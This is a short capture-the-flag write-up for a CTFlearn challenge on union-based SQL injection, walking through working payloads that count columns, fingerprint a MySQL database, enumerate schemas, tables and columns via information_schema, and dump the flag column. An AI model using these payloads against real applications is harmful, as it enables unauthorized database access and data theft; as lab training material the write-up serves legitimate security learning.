# URL
https://ctflearn.com/challenge/149
# Concept
* union SQL injection
# Method of solve
* go to the website provided
* there is an SQL injectable field that we can interact with
* the first thing we need to do is determine the number of columns that the original query returns
* this payload will let us know that the number of columns is four:
```
1 UNION SELECT null,null,null,null -- 
```
* the next step is to determine which DBMS is being used by the app
* this payload lets us know that the app is using a MySQL-compatible DBMS
```
1 UNION SELECT null,null,version(),null --
```
* the next step is to determine the name of the database being used
* this payload lets us know that the database's name is `webeight`
```
1 UNION SELECT null,null,schema_name,null FROM information_schema.schemata --
```
* the next step is to determine the table names
* this payload lets us know that the table name is `w0w_y0u_f0und_m3`
```
1 union SELECT null,null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema = database() --
```
* the next step is to find out the column names in the table
* this payload lets us know that these are the names of the columns:
```
-1 union select null,null,column_name,null FROM information_schema.columns -- -
```
* the last step is to get everything from that column with the following payload
```
-1 union select null,null,f0und_m3,null FROM w0w_y0u_f0und_m3 -- -
```
